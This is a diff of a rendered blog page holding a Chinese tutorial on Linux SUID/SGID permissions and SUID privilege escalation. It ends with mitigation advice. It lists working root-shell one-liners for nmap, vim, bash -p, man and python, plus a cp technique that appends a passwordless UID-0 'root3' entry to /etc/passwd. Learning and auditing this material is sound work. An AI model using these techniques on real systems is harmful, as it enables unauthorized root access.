@@ -11,28 +11,36 @@
         
             suid提权学习 |
         
-        p0melo&#39;blog
+        p0melo&#39;s blog
     </title>
     
 <link rel="stylesheet" href="/css/style.css">
 
     <link rel="shortcut icon" href="/images/p0melo.svg">
     
-<link rel="stylesheet" href="/css/font-awesome.min.css">
+<link rel="stylesheet" href="/fontawesome/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/brands.min.css">
 
     <script id="hexo-configurations">
     let KEEP = window.KEEP || {};
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/p0melo.svg","favicon":"/images/p0melo.svg","article_img_align":"left","left_side_width":"300px","content_max_width":"950px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/8ad759f62321493ee2e3565c60a3632a.jpeg","description":"心之所向，素履以往，生如逆旅，一苇以航。"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":false,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":false},"style":{"primary_color":"#0066cc","logo":null,"favicon":"/images/p0melo.svg","avatar":"/images/p0melo.svg","font_size":null,"font_family":null,"hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"心之所向，素履以往，生如逆旅，一苇以航。","font_color":null,"hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"appid":"E3140V5fTteP8KzwJweuefl2-gzGzoHsz","appkey":"Wo0PLY3dWpTTzUDW3Hbj6Gud","placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":false,"auto":false,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.5.2"};
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
   </script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
 <div class="progress-bar-container">
-    
-        <span class="scroll-progress-bar"></span>
     
 
     
@@ -46,13 +54,14 @@
     <div class="page-main-content">
 
         <div class="page-main-content-top">
-            <header class="header-wrapper">
+            
+<header class="header-wrapper">
 
     <div class="header-content">
         <div class="left">
             
             <a class="logo-title" href="/">
-                p0melo&#39;blog
+               p0melo&#39;s blog
             </a>
         </div>
 
@@ -73,6 +82,14 @@
                                href="/archives"
                             >
                                 ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
                             </a>
                         </li>
                     
@@ -107,6 +124,11 @@
                        href="/archives">ARCHIVES</a>
                 </li>
             
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
         </ul>
     </div>
 
@@ -123,29 +145,39 @@
 
                 
                     <div class="fade-in-down-animation">
-    <div class="article-content-container">
+    <div class="post-page-container">
+        <div class="article-content-container">
 
-        <div class="article-title">
-            <span class="title-hover-animation">suid提权学习</span>
-        </div>
+            <div class="article-title">
+                <span class="title-hover-animation">suid提权学习</span>
+            </div>
 
-        
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/images/p0melo.svg">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">p0melo</span>
-                        
-                            <span class="author-label">Lv2</span>
-                        
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/p0melo.svg">
                     </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">p0melo</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
     <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2021-06-27 15:44:14
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2021-06-27 15:44:14</span>
+        <span class="mobile">2021-06-27 15:44</span>
     </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2022-07-09 18:07:27</span>
+    </span>
+    
     
     
 
@@ -155,13 +187,13 @@
     
 </div>
 
+                        </div>
                     </div>
                 </div>
-            </div>
-        
+            
 
-        <div class="article-content markdown-body">
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在p牛博客看到有关suid提权的<a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >文章<i class="fas fa-external-link-alt"></i></a>，所以打算对linux suid提权这块学习记录下，由于是首次接触suid的概念，所以文章前面定义部分记录的比较详细（啰嗦），以便后续学习。</p>
+            <div class="article-content keep-markdown-body">
+                <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在p牛博客看到有关suid提权的<a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >文章<i class="fas fa-external-link-alt"></i></a>，所以打算对linux suid提权这块学习记录下，由于是首次接触suid的概念，所以文章前面定义部分记录的比较详细（啰嗦），以便后续学习。</p>
 <h2 id="0x01-什么是SUID"><a href="#0x01-什么是SUID" class="headerlink" title="0x01 什么是SUID"></a>0x01 什么是SUID</h2><h3 id="1-1-SUID"><a href="#1-1-SUID" class="headerlink" title="1.1 SUID"></a>1.1 SUID</h3><p>SUID全称是Set owner User ID up on execution，suid是赋予二进制文件一个权限，它允许程序执行者在执行时具有该程序的拥有者(owner)的权限，对于SUID权限的文件基本有这样的限制与功能：</p>
 <ul>
 <li><strong>SUID权限仅对二进制程序有效</strong></li>
@@ -169,13 +201,13 @@
 <li><strong>本权限仅在执行该程序的过程中有效（run-time）</strong></li>
 <li><strong>执行者将具有该程序拥有者的（owner）权限</strong></li>
 </ul>
-<p>这里举个栗子说明下，linux中每个用户的账号密码都存储在<code>/etc/shadow</code>文件中，该文件的权限为<code>-rw-r-----</code>，普通用户无法直接修改，但每个用户都可以通过<code>passwd</code>命令来修改自己的密码，为什么/etc/shadow只允许root用户读取修改的，普通用户却能够修改这个文件内的密码呢？这就是SUID的作用。</p>
+<p>这里举个栗子说明下，linux中每个用户的账号密码都存储在<code>/etc/shadow</code>文件中，该文件的权限为<code>-rw-r-----</code>，普通用户无法直接修改，但每个用户都可以通过<code>passwd</code>命令来修改自己的密码，为什么&#x2F;etc&#x2F;shadow只允许root用户读取修改的，普通用户却能够修改这个文件内的密码呢？这就是SUID的作用。</p>
 <p><code>passwd</code>命令对应的路径是<code>/usr/bin/passwd</code>，我们可以看到它的文件权限为<code>-rwsr-xr-x</code>，这里<code>passwd</code>设置了SUID权限，我们来看下普通用户tester如何通过SUID权限完成修改密码操作的：</p>
 <ol>
-<li>tester 用户对于 /usr/bin/passwd 这个程序具有执行权限，因此可以执行 passwd 程序</li>
+<li>tester 用户对于 &#x2F;usr&#x2F;bin&#x2F;passwd 这个程序具有执行权限，因此可以执行 passwd 程序</li>
 <li>passwd 程序的所有者为 root</li>
 <li>tester 用户执行 passwd 程序的过程中会暂时获得 root 权限</li>
-<li>因此 tester 用户在执行 passwd 程序的过程中可以修改 /etc/shadow 文件</li>
+<li>因此 tester 用户在执行 passwd 程序的过程中可以修改 &#x2F;etc&#x2F;shadow 文件</li>
 </ol>
 <p>普通用户直接使用<code>cat</code>查看<code>/etc/shadow</code>文件是被禁止的，这里用一张示意图来表示两者区别</p>
 <img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/952033-20180915174007691-528388363.png" class="" title="img">
@@ -189,7 +221,7 @@
 <li>执行者在执行的过程中将会获得改程序用户组的支持</li>
 </ul>
 <p>举个栗子，使用<code>/usr/bin/locate</code>这个程序可以去查找<code>/var/lib/mlocate/mlocate.db</code>这个文件的内容，查看对应文件权限</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lrwxrwxrwx 1 root root 24 Nov 17  2020 /usr/bin/locate -&gt; /etc/alternatives/locate</span><br><span class="line">lrwxrwxrwx 1 root root 16 Nov 17  2020 /etc/alternatives/locate -&gt; /usr/bin/mlocate</span><br><span class="line"><span class="meta">#</span><span class="bash"> locate是软链接指向mlocate，所以修改软连接locate的sgid权限也就是修改mlocate</span></span><br><span class="line">-rwxr-sr-x 1 root mlocate 39608 Nov 15  2018 /usr/bin/mlocate</span><br><span class="line">-rw-r----- 1 root mlocate 1292585 Jun 26 14:25 /var/lib/mlocate/mlocate.db</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lrwxrwxrwx 1 root root 24 Nov 17  2020 /usr/bin/locate -&gt; /etc/alternatives/locate</span><br><span class="line">lrwxrwxrwx 1 root root 16 Nov 17  2020 /etc/alternatives/locate -&gt; /usr/bin/mlocate</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">locate是软链接指向mlocate，所以修改软连接locate的sgid权限也就是修改mlocate</span></span><br><span class="line">-rwxr-sr-x 1 root mlocate 39608 Nov 15  2018 /usr/bin/mlocate</span><br><span class="line">-rw-r----- 1 root mlocate 1292585 Jun 26 14:25 /var/lib/mlocate/mlocate.db</span><br></pre></td></tr></table></figure>
 
 <p>如果我使用普通用户tester执行locate时，tester将会取得mlocate组的支持，因此就可以去读取mlocate.db的内容了。执行过程示意图如下</p>
 <img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/952033-20180915174309311-990901650.png" class="" title="img">
@@ -197,25 +229,25 @@
 <p>另外，SGID对目录也支持，当用户对某一目录有写和执行权限时，该用户就可以在该目录下建立文件，如果该目录用 SGID 修饰，则该用户在这个目录下建立的文件都是属于这个目录所属的组。如下图示例，sgidtest目录属于root组，且赋予了SGID权限，poom用户在该目录下创建文件将为root属组。</p>
 <img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210626231049994.png" class="" title="image-20210626231049994">
 
-<h3 id="1-3-SBIT"><a href="#1-3-SBIT" class="headerlink" title="1.3 SBIT"></a>1.3 SBIT</h3><p>其实 SBIT 与 SUID 和 SGID 的关系并不大。SBIT 是 the restricted deletion flag or sticky bit 的简称。SBIT 目前只对目录有效，用来阻止非文件的所有者删除文件。比较常见的例子就是 /tmp 目录：</p>
+<h3 id="1-3-SBIT"><a href="#1-3-SBIT" class="headerlink" title="1.3 SBIT"></a>1.3 SBIT</h3><p>其实 SBIT 与 SUID 和 SGID 的关系并不大。SBIT 是 the restricted deletion flag or sticky bit 的简称。SBIT 目前只对目录有效，用来阻止非文件的所有者删除文件。比较常见的例子就是 &#x2F;tmp 目录：</p>
 <img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210626231156650.png" class="" title="image-20210626231156650">
 
 <p>权限信息中最后一位 t 表明该目录被设置了 SBIT 权限。SBIT 对目录的作用是：当用户在该目录下创建新文件或目录时，仅有自己和 root 才有权力删除。</p>
 <h3 id="1-4-如何设置SUID、SGID、SBIT权限"><a href="#1-4-如何设置SUID、SGID、SBIT权限" class="headerlink" title="1.4 如何设置SUID、SGID、SBIT权限"></a>1.4 如何设置SUID、SGID、SBIT权限</h3><p>SUID、SGID、SBIT权限对应的数字为<code>SUID-&gt;4，SGID-&gt;2，SBIT-&gt;1</code></p>
 <p>通过数字法设置</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 4755 filename</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 4755 filename</span><br></pre></td></tr></table></figure>
 
 <p>通过符号法设置</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s filename</span><br><span class="line">chmod g+s filename </span><br><span class="line">chmod o+s filename</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s filename</span><br><span class="line">chmod g+s filename </span><br><span class="line">chmod o+s filename</span><br></pre></td></tr></table></figure>
 
-<p>若权限为大写S或T，则说明user/group/others本身就没有执行权限。</p>
+<p>若权限为大写S或T，则说明user&#x2F;group&#x2F;others本身就没有执行权限。</p>
 <h2 id="0x02-关于SUID提权"><a href="#0x02-关于SUID提权" class="headerlink" title="0x02 关于SUID提权"></a>0x02 关于SUID提权</h2><p>先介绍下linux进程在运行时有3个UID:</p>
 <ul>
 <li>Real UID 执行该进程的用户实际的UID</li>
 <li>Effective UID 程序实际操作时生效的UID（比如写入文件时，系统会检查这个UID是否有权限）</li>
 <li>Saved UID 在高权限用户降权后，保留的其原本UID</li>
 </ul>
-<p>在设置了SUID权限的程序在其运行时，进程的Effective UID将为程序的拥有者。例如前面说的<code>/user/bin/passwd</code>命令的权限为<code>-rwsr-xr-x</code>，程序的拥有者为root（uid=0），普通用户在执行<code>passwd</code>命令时Effective UID就为0，所以可以完成更改密码的操作。</p>
+<p>在设置了SUID权限的程序在其运行时，进程的Effective UID将为程序的拥有者。例如前面说的<code>/user/bin/passwd</code>命令的权限为<code>-rwsr-xr-x</code>，程序的拥有者为root（uid&#x3D;0），普通用户在执行<code>passwd</code>命令时Effective UID就为0，所以可以完成更改密码的操作。</p>
 <p>我们知道nmap需要进行UDP或TCP SYN扫描时需要用到root权限，所以很多管理员会给nmap加上SUID权限，这样普通用户就可以随便使用nmap了。在nmap 5.20版本以前存在interactive交互模式，当nmap设置了SUID权限时，我们可以进入交互模式输入<code>!sh</code>提权。</p>
 <p>所以<strong>拥有SUID的程序存在命令注入漏洞或其本身存在执行命令的功能，且这个程序所有者的uid为0或其他super user</strong>，那么就有SUID提权的风险。</p>
 <p><strong>如何查找具有SUID权限的文件</strong></p>
@@ -224,7 +256,7 @@
 <p>也可通过<code>sudo -l</code>列出当前用户可sudo执行的命令</p>
 <h2 id="0x03-常用于SUID提权的命令"><a href="#0x03-常用于SUID提权的命令" class="headerlink" title="0x03 常用于SUID提权的命令"></a>0x03 常用于SUID提权的命令</h2><p>下面介绍几种命令，如果这些命令具有SUID权限，将有本地提权的风险。</p>
 <h3 id="3-1-nmap"><a href="#3-1-nmap" class="headerlink" title="3.1 nmap"></a>3.1 nmap</h3><h4 id="3-1-1-nmap-2-02-5-21版本"><a href="#3-1-1-nmap-2-02-5-21版本" class="headerlink" title="3.1.1 nmap 2.02-5.21版本"></a>3.1.1 nmap 2.02-5.21版本</h4><p>namp在低版本具有交互模式，可利用交互模式提权</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure>
 
 <p>另外Metasploit也有nmap提权的模块：<code>exploit/unix/local/setuid_nmap</code></p>
 <h4 id="3-1-2-nmap高版本"><a href="#3-1-2-nmap高版本" class="headerlink" title="3.1.2 nmap高版本"></a>3.1.2 nmap高版本</h4><p>namp在高版本取消了交互模式，可编写nmap的nse脚本，修改<code>/etc/passwd</code>来新增一个用户root2来达到提权的目的。</p>
@@ -239,18 +271,18 @@
 
 <img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627125229567.png" class="" title="image-20210627125229567">
 
-<h3 id="3-3-vi-vim"><a href="#3-3-vi-vim" class="headerlink" title="3.3 vi/vim"></a>3.3 vi/vim</h3><p>进入vim模式执行以下命令</p>
+<h3 id="3-3-vi-x2F-vim"><a href="#3-3-vi-x2F-vim" class="headerlink" title="3.3 vi&#x2F;vim"></a>3.3 vi&#x2F;vim</h3><p>进入vim模式执行以下命令</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
 
 <img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627134106867.png" class="" title="image-20210627134106867">
 
 <p>若有sudo权限则可执行<code>sudo vim -c &#39;!sh&#39;</code>直接提权</p>
-<h3 id="3-4-bash"><a href="#3-4-bash" class="headerlink" title="3.4 bash"></a>3.4 bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure>
+<h3 id="3-4-bash"><a href="#3-4-bash" class="headerlink" title="3.4 bash"></a>3.4 bash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure>
 
 <img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627134208588.png" class="" title="image-20210627134208588">
 
 <h3 id="3-5-cp"><a href="#3-5-cp" class="headerlink" title="3.5 cp"></a>3.5 cp</h3><p>跟高版本nmap提权方法类似，覆盖 <code>/etc/shadow</code> 或 <code>/etc/passwd</code></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/passwd &gt;passwd</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&#x27;root3::0:0::/root:/bin/bash&#x27;</span> &gt;&gt;passwd</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp passwd /etc/passwd</span>  </span><br><span class="line"><span class="meta">$</span><span class="bash"> su root3</span> </span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/passwd &gt;passwd</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;root3::0:0::/root:/bin/bash&#x27;</span> &gt;&gt;passwd</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cp</span> passwd /etc/passwd</span>  </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">su root3</span> </span><br></pre></td></tr></table></figure>
 
 <img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627142406117.png" class="" title="image-20210627142406117">
 
@@ -272,7 +304,7 @@
 
 <h4 id="3-9-4-man"><a href="#3-9-4-man" class="headerlink" title="3.9.4 man"></a>3.9.4 man</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">man passwd</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
 
-<h4 id="3-9-5-python-perl-ruby-lua-php-etc"><a href="#3-9-5-python-perl-ruby-lua-php-etc" class="headerlink" title="3.9.5 python/perl/ruby/lua/php/etc"></a>3.9.5 python/perl/ruby/lua/php/etc</h4><p>python</p>
+<h4 id="3-9-5-python-x2F-perl-x2F-ruby-x2F-lua-x2F-php-x2F-etc"><a href="#3-9-5-python-x2F-perl-x2F-ruby-x2F-lua-x2F-php-x2F-etc" class="headerlink" title="3.9.5 python&#x2F;perl&#x2F;ruby&#x2F;lua&#x2F;php&#x2F;etc"></a>3.9.5 python&#x2F;perl&#x2F;ruby&#x2F;lua&#x2F;php&#x2F;etc</h4><p>python</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
 
 <p>perl</p>
@@ -281,7 +313,7 @@
 <h2 id="0x04-如何缓解"><a href="#0x04-如何缓解" class="headerlink" title="0x04 如何缓解"></a>0x04 如何缓解</h2><p>管理员应仔细审查所有SUID二进制文件，看看到底是否真的需要使用提权后运行。在这个审查过程中，<strong>应该特别关注能够在系统上执行代码或写入数据的那些应用程序</strong>。</p>
 <p>对于类似nmap和ping的程序，只需要网络相关的特权即可，Linux 2.2以后增加了capabilities的概念，我们可以用到capabilities这东西做权限分离。</p>
 <p>查看kali下ping命令的capabilities</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">getcap</span> /usr/bin/ping</span></span><br><span class="line">/usr/bin/ping cap_net_raw=ep</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">getcap</span> /usr/bin/ping</span></span><br><span class="line">/usr/bin/ping cap_net_raw=ep</span><br></pre></td></tr></table></figure>
 
 <p>这就是为什么<code>ping</code>命令未设置suid权限，却仍然可以以普通用户身份运行的原因，同样我们也可以给nmap命令增加类似的capabilities，普通用户就可以执行TCP SYN扫描啦</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap</span><br><span class="line">nmap --privileged -sU 127.0.0.1</span><br></pre></td></tr></table></figure>
@@ -293,116 +325,141 @@
 <p><a class="link"   target="_blank" rel="noopener" href="https://jlkl.github.io/2020/01/27/Web_15/" >Linux SUID 提权<i class="fas fa-external-link-alt"></i></a></p>
 <p>《鸟哥的linux私房菜（第四版）–6.4.3章》</p>
 
-        </div>
+            </div>
 
-        
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li>
+            <span class="type">Post title</span>：<span class="content">suid提权学习</span>
+        </li>
+        <li>
+            <span class="type">Post author</span>：<span class="content">p0melo</span>
+        </li>
+        <li>
+            <span class="type">Create time</span>：<span class="content">2021-06-27 15:44:14</span>
+        </li>
+        <li class="post-link">
+            <span class="type">Post link</span>：<span class="content">2021/06/27/suid提权学习/</span>
+        </li>
+        <li>
+            <span class="type">Copyright Notice</span>：<span class="content">All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.</span>
+        </li>
+    </ul>
+</div>
 
-        
-            <div class="article-nav">
-                
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"
-                        >
+                </div>
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"
+                            >
                             <span class="left arrow-icon flex-center">
                               <i class="fas fa-chevron-left"></i>
                             </span>
-                            <span class="title flex-center">
+                                <span class="title flex-center">
                                 <span class="post-nav-title-item">CSP策略及绕过方法</span>
                                 <span class="post-nav-item">Prev posts</span>
                             </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/"
-                        >
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/"
+                            >
                             <span class="title flex-center">
                                 <span class="post-nav-title-item">通过mysql获取shell的几种方法</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
-                            <span class="right arrow-icon flex-center">
+                                <span class="right arrow-icon flex-center">
                               <i class="fas fa-chevron-right"></i>
                             </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
+                            </a>
+                        </div>
+                    
+                </div>
+            
 
-        
-            <div class="comment-container">
-                <div class="comments-container">
-    <div id="comment-anchor"></div>
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
     <div class="comment-area-title">
-        <i class="fas fa-comments">&nbsp;Comments</i>
+        <i class="fas fa-comments"></i>&nbsp;Comments
     </div>
     
-
         
             
+
     <div class="valine-container">
-        <script 
-                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <script  src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
         <div id="vcomments"></div>
         <script >
-            function loadValine() {
-                new Valine({
-                    el: '#vcomments',
-                    appId: 'E3140V5fTteP8KzwJweuefl2-gzGzoHsz',
-                    appKey: 'Wo0PLY3dWpTTzUDW3Hbj6Gud',
-                    meta: ['nick', 'mail', 'link'],
-                    avatar: 'wavatar',
-                    enableQQ: true,
-                    placeholder: '欢迎吐槽~',
-                    lang: 'en'.toLowerCase()
-                });
+          function loadValine() {
+            new Valine({
+              el: '#vcomments',
+              appId: 'E3140V5fTteP8KzwJweuefl2-gzGzoHsz',
+              appKey: 'Wo0PLY3dWpTTzUDW3Hbj6Gud',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: '',
+              lang: 'en'.toLowerCase()
+            });
 
-                function getAuthor(language) {
-                    switch (language) {
-                        case 'en':
-                            return 'Author';
-                        case 'zh-CN':
-                            return '博主';
-                        default:
-                            return 'Master';
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author';
+                case 'zh-CN':
+                  return '博主';
+                default:
+                  return 'Master';
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+              if (vcards.length > 0) {
+                let author = 'p0melo';
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick');
+                    const vnick = vnick_dom.innerHTML;
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                     }
+                  }
                 }
+                clearInterval(getValineDomTimer);
+              } else {
+                clearInterval(getValineDomTimer);
+              }
+            }, 2000);
+          }
 
-                // Add "Author" identify
-                const getValineDomTimer = setInterval(() => {
-                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
-                    if (vcards.length > 0) {
-                        let author = 'p0melo';
-
-                        if (author) {
-                            for (let vcard of vcards) {
-                                const vnick_dom = vcard.querySelector('.vhead .vnick');
-                                const vnick = vnick_dom.innerHTML;
-                                if (vnick === author) {
-                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
-                                }
-                            }
-                        }
-                        clearInterval(getValineDomTimer);
-                    } else {
-                        clearInterval(getValineDomTimer);
-                    }
-                }, 2000);
-            }
-
-            if ('false') {
-                const loadValineTimeout = setTimeout(() => {
-                    loadValine();
-                    clearTimeout(loadValineTimeout);
-                }, 1000);
-            } else {
-                window.addEventListener('DOMContentLoaded', loadValine);
-            }
+          if ('false' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine();
+              clearTimeout(loadValineTimeout);
+            }, 1000);
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine);
+          }
         </script>
     </div>
 
@@ -410,6 +467,18 @@
 
         
     
+</div>
+
+                </div>
+            
